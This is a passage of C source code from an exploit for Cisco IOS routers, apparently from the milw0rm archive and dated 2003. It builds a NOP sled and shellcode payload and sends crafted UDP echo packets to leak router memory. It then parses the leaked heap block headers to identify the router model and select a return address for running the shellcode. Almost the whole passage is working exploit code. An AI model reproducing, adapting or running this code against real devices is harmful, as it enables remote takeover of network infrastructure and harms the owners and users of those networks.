for (i=0;i&lt; (leak.nop_sled/cisco_boxes[shellcode].noplen) ;i++) {
memcpy(t,cisco_boxes[shellcode].nop,cisco_boxes[shellcode].noplen);
t+=cisco_boxes[shellcode].noplen;
}
// 
// add the real code
//
memcpy(t,cisco_boxes[shellcode].code,cisco_boxes[shellcode].codelen);
t+=cisco_boxes[shellcode].codelen;
sclen=leak.nop_sled + cisco_boxes[shellcode].codelen;
//
// calculate a nop_offset and align
//
leak.nop_offset=leak.nop_sled * 0.8;
while ( (leak.nop_offset % cisco_boxes[shellcode].noplen) != 0) 
leak.nop_offset--;

if (cfg.verbose) hexdump(st,sclen);

}
packet=UDPecho(&amp;length,sc,sclen);

//
// allocate receive buffer
//
rbuf=smalloc(cfg.leakme+0x200);

// 
// do it
//
printf(&quot;Getting IO memory leak data (%u times) ...\n&quot;,r);
while (r--) {
sendpack_IP4(leak.sfd,packet,length);

tv.tv_sec=cfg.timeout;
tv.tv_usec=0;
FD_ZERO(&amp;rfds);
FD_SET(leak.udpsfd,&amp;rfds);
select_ret=select(leak.udpsfd+1,&amp;rfds,NULL,NULL,&amp;tv);

if (select_ret&gt;0) {
rx=recvfrom(leak.udpsfd,rbuf,cfg.leakme,0,(struct sockaddr *)&amp;frm,&amp;frmlen);
if (rx&lt;0) {
fprintf(stderr,&quot;UDP recvfrom() failed\n&quot;);
return (-1);
}
if (cfg.verbose) printf(&quot;Received %u bytes data\n&quot;,rx);
if (cfg.verbose&gt;1) hexdump(rbuf,rx);
recvflag=1;
// 
// analyze what we got
//
UDPanalyze(rbuf,rx,sc,sclen);
} else {
printf(&quot;Timeout at %u - may be lost packet?\n&quot;,r);
}
}

//
// clean up
//
free(packet);
free(rbuf);
if (st!=NULL) free(st);
close(leak.sfd);
close(leak.udpsfd);
if (cfg.verbose==0) printf(&quot;\n&quot;); // be nice

if (recvflag) { return 0; } else { return 1; }
}


unsigned char *UDPecho(
unsigned int *plen, // returned length of packet
unsigned char *payload, // pointer to payload
unsigned int payload_len // length of payload
) {
unsigned char *pack;
iphdr_t *ip;
udphdr_t *udp;
u_char *pay;
u_char *t;
u_int16_t cs;

*plen=sizeof(iphdr_t)+sizeof(udphdr_t)+payload_len;
pack=smalloc(*plen+10);

ip=(iphdr_t *)pack;
ip-&gt;version=4;
ip-&gt;ihl=sizeof(iphdr_t)/4;
ip-&gt;ttl=0x80;
ip-&gt;protocol=IPPROTO_UDP;
memcpy(&amp;(ip-&gt;saddr.s_addr),&amp;(packet_ifconfig.ip.s_addr),IP_ADDR_LEN);
memcpy(&amp;(ip-&gt;daddr.s_addr),&amp;(cfg.target_addr),IP_ADDR_LEN);

udp=(udphdr_t *)((void *)ip+sizeof(iphdr_t));
udp-&gt;sport=htons(LOCALPORT);
udp-&gt;dport=htons(7);
udp-&gt;length=htons(cfg.leakme);

pay=(u_char *)((void *)udp+sizeof(udphdr_t));
t=pay;
memcpy(pay,payload,payload_len);
t+=payload_len;

ip-&gt;tot_len=htons(*plen);
cs=chksum((u_char *)ip,sizeof(iphdr_t));
ip-&gt;check=cs;

if (cfg.verbose&gt;1) hexdump(pack,*plen);
return pack;
}


void UDPanalyze(unsigned char *b, unsigned int len,
unsigned char *expected, unsigned int expected_length) {
#define ST_MAGIC 1
#define ST_PID 2
#define ST_CHECK 3
#define ST_NAME 4
#define ST_PC 5
#define ST_NEXT 6
#define ST_PREV 7
#define ST_SIZE 8
#define ST_REF 9
#define ST_LASTDE 10
#define ST_ID_ME_NOW 100
unsigned char *p;
int state=0;
int i=0;

unsigned char *opcode_begin;
unsigned char *block2_next_field;
unsigned int block3_next_val;

unsigned int p_name;
unsigned int p_pc;
unsigned int p_next;
unsigned int p_prev;


opcode_begin=NULL;
block2_next_field=NULL;
block3_next_val=0;

if ((!memcmp(b,expected,expected_length))) {
if (cfg.verbose&gt;1) printf(&quot;Payload found!\n&quot;);
opcode_begin=b;
}

p=b;
while ((b+len-4)&gt;p) {

if ( (p[0]==0xfd) &amp;&amp; (p[1]==0x01) &amp;&amp; (p[2]==0x10) &amp;&amp; (p[3]==0xDF) ) {
if (cfg.verbose&gt;1) printf(&quot;REDZONE MATCH!\n&quot;);
else { printf(&quot;!&quot;); fflush(stdout); }
state=ST_MAGIC;
p+=4;
}

switch (state) {
case ST_MAGIC:
if (cfg.verbose)
printf(&quot;MEMORY BLOCK\n&quot;);
state++;
p+=4;
break;

case ST_PID:
if (cfg.verbose)
printf(&quot;\tPID : %08X\n&quot;,ntohl(*(unsigned int *)p));
state++;
p+=4;
break;

case ST_CHECK:
if (cfg.verbose)
printf(&quot;\tAlloc Check: %08X\n&quot;,ntohl(*(unsigned int *)p));
state++; 
p+=4;
break;

case ST_NAME:
p_name=ntohl(*(unsigned int *)p);
if (cfg.verbose)
printf(&quot;\tAlloc Name : %08X\n&quot;,p_name);
state++;
p+=4;
break;

case ST_PC:
p_pc=ntohl(*(unsigned int *)p);
if (cfg.verbose)
printf(&quot;\tAlloc PC : %08X\n&quot;,p_pc);
state++;
p+=4;
break;

case ST_NEXT:
p_next=ntohl(*(unsigned int *)p);
if (cfg.verbose) 
printf(&quot;\tNEXT Block : %08X\n&quot;,p_next);
if (block2_next_field==NULL) {
if (cfg.verbose) printf(&quot;Assigning as block2_next_field\n&quot;);
block2_next_field=p;
} else if (block3_next_val==0) {
if (cfg.verbose) printf(&quot;Assigning as block3_next_val\n&quot;);
block3_next_val=p_next;
}
state++;
p+=4;
break;

case ST_PREV:
p_prev=ntohl(*(unsigned int *)p);
if (cfg.verbose)
printf(&quot;\tPREV Block : %08X\n&quot;,p_prev);
state++;
p+=4;
break;

case ST_SIZE:
if (cfg.verbose)
printf(&quot;\tBlock Size : %8u words&quot;,
ntohl(*(unsigned int *)p)&amp;0x7FFFFFFF);
if (ntohl(*(unsigned int *)p)&amp;0x80000000) {
if (cfg.verbose)
printf(&quot; (Block in use)\n&quot;);
} else {
if (cfg.verbose)
printf(&quot; (Block NOT in use)\n&quot;);
}
state++;
p+=4;
break;

case ST_REF:
if (cfg.verbose)
printf(&quot;\tReferences : %8u\n&quot;,ntohl(*(unsigned int *)p));
state++;
p+=4;
break;

case ST_LASTDE:
if (cfg.verbose)
printf(&quot;\tLast DeAlc : %08X\n&quot;,ntohl(*(unsigned int *)p));
state=ST_ID_ME_NOW;
p+=4;
break;

//
// Identification 
//
case ST_ID_ME_NOW:

i=0;
while ((leak.guess==-1)&amp;&amp;(cisco_boxes[i].name!=NULL)) {
if (
(p_name&gt;=cisco_boxes[i].PC_start) &amp;&amp; 
(p_name&lt;=cisco_boxes[i].PC_end) &amp;&amp;
(p_pc&gt;=cisco_boxes[i].PC_start) &amp;&amp; 
(p_pc&lt;=cisco_boxes[i].PC_end) &amp;&amp;
(p_next&gt;=cisco_boxes[i].IO_start) &amp;&amp; 
(p_next&lt;=cisco_boxes[i].IO_end) &amp;&amp;
(p_prev&gt;=cisco_boxes[i].IO_start) &amp;&amp; 
(p_prev&lt;=cisco_boxes[i].IO_end)
) {
leak.guess=i;
break;
}
i++;
}
state=0;
p+=4;
break;

default:
p+=1;

}
}

if ( (opcode_begin!=NULL) &amp;&amp; (block2_next_field!=NULL) &amp;&amp; (block3_next_val!=0) ) {
unsigned int delta;
unsigned int a;
unsigned int i;
int flag=0;

delta=(unsigned int)((void*)block2_next_field - (void*)opcode_begin);
a=block3_next_val-delta;

if (cfg.verbose) {
printf(&quot;\n&quot;);
printf(&quot;Delta between opcode_begin (%p) &quot;
&quot;and block2_next_field (%p) is %u\n&quot;,
(void*)block2_next_field, (void*)opcode_begin, delta);
printf(&quot;The third block is at 0x%08X\n&quot;, block3_next_val);
printf(&quot;Therefore, the code should be located at 0x%08X\n&quot;,a);
}

for (i=0;i&lt;leak.addrc;i++) {
if (leak.addrs[i].a==a) {
leak.addrs[i].count++;
flag++;
break;
}
}
if ((flag==0)&amp;&amp;(leak.addrc&lt;MAXADDRS-1)) {
leak.addrs[leak.addrc++].a=a;
leak.addrs[leak.addrc].count=1;
leak.lastaddr=a;
}
}
}


unsigned int SelectAddress(void) {
unsigned int the_address;
int rnd_addr;
unsigned int i,j;
addrs_t atmp;
addrs_t consider[MAXADDRS];
unsigned int consc=0;

if (leak.addrc==0) {
fprintf(stderr,&quot;ERROR: No addresses available. Unable to recover\n&quot;);
return 0;
}
for (i=0;i&lt;leak.addrc;i++) 
printf(&quot; Address 0x%08X (%u times)\n&quot;,
leak.addrs[i].a,
leak.addrs[i].count);

//
// put addresses to consider in another array.
// We only want those above our threshold, to prevent irregular buffers
//
memset(&amp;consider,0,sizeof(consider));
for (i=0;i&lt;leak.addrc;i++) {
if (leak.addrs[i].count&lt;LOW_COUNT_THR) {
printf(&quot;Address 0x%08X count below threshold\n&quot;,
leak.addrs[i].a);
continue;
}
consider[consc]=leak.addrs[i];
consc++;
}

//
// bubble sort addresses, unless we are operating count based, where we 
// sort by times of appearences
//
if (cfg.strategy != S_FREQUENT) {
for (i=0;i&lt;consc-1;i++) {
for (j=0;j&lt;(consc-1-i);j++) {
if (consider[j+1].a &lt; consider[j].a) {
atmp=consider[j];
consider[j] = consider[j+1];
consider[j+1] = atmp;
}
}
}
} else {
for (i=0;i&lt;consc-1;i++) {
for (j=0;j&lt;(consc-1-i);j++) {
if (consider[j+1].count &lt; consider[j].count) {
atmp=consider[j];
consider[j] = consider[j+1];
consider[j+1] = atmp;
}
}
}
}

printf(&quot;Cleaned up, remaining addresses %u\n&quot;,consc);
if (consc==0) {
fprintf(stderr,&quot;ERROR: No addresses left. Unable to recover\n&quot;
&quot;You can try to decrease LOW_COUNT_THR in the source\n&quot;);
return 0;
}
for (i=0;i&lt;consc;i++) 
printf(&quot; Address 0x%08X (%u times)\n&quot;,
consider[i].a,
consider[i].count);



switch (cfg.strategy) {
case S_RANDOM: 
{
srand((unsigned long)time(NULL));
rnd_addr=(int)(((float)consc-1)*rand()/(RAND_MAX+1.0));
the_address=consider[rnd_addr].a + leak.nop_offset;
printf(&quot;Use pseudo-randomly selected address 0x%08X (0x%08X)\n&quot;,
the_address,consider[rnd_addr].a);
}
break;
case S_LAST: 
{
the_address=leak.lastaddr + leak.nop_offset;
printf(&quot;Using last address 0x%08X\n&quot;,the_address);
}
break;
case S_SMALLEST:
{
if (consc==1) {
the_address= consider[0].a + leak.nop_offset;
printf(&quot;Using smallest address 0x%08X (0x%08X)\n&quot;,
the_address,consider[0].a);
} else if (consc==2) {
the_address= consider[1].a + leak.nop_offset;
printf(&quot;Using second smallest address 0x%08X (0x%08X)\n&quot;,
the_address,consider[1].a);
} else {
the_address= consider[2].a + leak.nop_offset;
printf(&quot;Using third smallest address 0x%08X (0x%08X)\n&quot;,
the_address,consider[2].a);
}
}
break;
case S_HIGHEST:
{
the_address= consider[consc-1].a + leak.nop_offset;
printf(&quot;Using highest address 0x%08X (0x%08X)\n&quot;,
the_address,consider[consc-1].a);
}
break;
case S_FREQUENT:
{
// already sorted by frequency
the_address= consider[consc-1].a + leak.nop_offset;
printf(&quot;Using most frequent address 0x%08X (0x%08X)\n&quot;,
the_address,consider[consc-1].a);
}
break;
default:
fprintf(stderr,&quot;ERROR: unknown address strategy selected\n&quot;);
return (0);
}

return the_address;
}

// milw0rm.com [2003-08-10]
</pre>
</html>

